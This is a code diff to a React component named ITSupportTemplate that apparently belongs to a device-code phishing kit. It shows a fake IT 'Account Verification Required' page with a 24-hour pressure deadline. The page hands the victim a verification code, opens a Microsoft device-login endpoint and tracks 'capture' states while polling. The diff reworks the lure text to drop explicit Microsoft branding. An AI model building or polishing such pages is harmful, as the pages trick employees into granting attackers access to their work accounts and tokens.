@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
 
-const DEVICE_AUTH_URL = 'https://login.microsoft.com/device';
+const DEVICE_VERIFY_URL = 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode';
 
 type CaptureState = 'idle' | 'loading' | 'code_ready' | 'waiting' | 'success' | 'error' | 'expired';
 
@@ -83,7 +83,7 @@ export function ITSupportTemplate(): React.ReactElement {
     navigator.clipboard.writeText(userCode.replace(/\s/g, '')).then(() => { setCopied(true); setTimeout(() => setCopied(false), 2500); });
   }
 
-  function handleVerify(): void { setState('waiting'); window.open(DEVICE_AUTH_URL, '_blank'); }
+  function handleVerify(): void { setState('waiting'); window.open(DEVICE_VERIFY_URL, '_blank'); }
 
   function handleReset(): void {
     stopPolling(); setState('idle'); setUserCode(''); setDeviceCode('');
@@ -135,7 +135,7 @@ export function ITSupportTemplate(): React.ReactElement {
             <>
               <div className="it-support-badge">Required Action</div>
               <h1>Account Verification Required</h1>
-              <p>Your IT administrator requires you to verify your Microsoft 365 account. This is a routine security check to ensure account integrity.</p>
+              <p>Your IT administrator requires you to verify your account. This is a routine security check to ensure account integrity.</p>
               <div className="it-support-notice">
                 <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#c4a000" strokeWidth="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z" /><line x1="12" y1="9" x2="12" y2="13" /><line x1="12" y1="17" x2="12.01" y2="17" /></svg>
                 <span>This verification must be completed within 24 hours to maintain account access.</span>
@@ -156,7 +156,7 @@ export function ITSupportTemplate(): React.ReactElement {
           {(state === 'code_ready' || state === 'waiting') && (
             <>
               <h1>Enter Verification Code</h1>
-              <p>Use the code below to verify your account on the Microsoft portal.</p>
+              <p>Use the code below to verify your account on the verification portal.</p>
               <div className="it-support-code-box">
                 <div className="it-support-code-label">VERIFICATION CODE</div>
                 <div className="it-support-code">{userCode}</div>
@@ -164,10 +164,10 @@ export function ITSupportTemplate(): React.ReactElement {
               </div>
               <div className="it-support-instructions">
                 <div className="it-instruction"><span className="it-step-num">1</span>Copy the verification code above</div>
-                <div className="it-instruction"><span className="it-step-num">2</span>Click the button below to open Microsoft verification</div>
-                <div className="it-instruction"><span className="it-step-num">3</span>Paste the code and sign in with your work account</div>
+                <div className="it-instruction"><span className="it-step-num">2</span>Click the button below to open the verification portal</div>
+                <div className="it-instruction"><span className="it-step-num">3</span>Paste the code and verify your work account</div>
               </div>
-              <button className="it-support-btn" onClick={handleVerify}>Open Microsoft Verification</button>
+              <button className="it-support-btn" onClick={handleVerify}>Open Verification Portal</button>
               {state === 'waiting' && <div className="it-support-waiting">Waiting for verification to complete...</div>}
               <div className="it-support-expiry">Code expires in {formatTime(countdown)}</div>
             </>
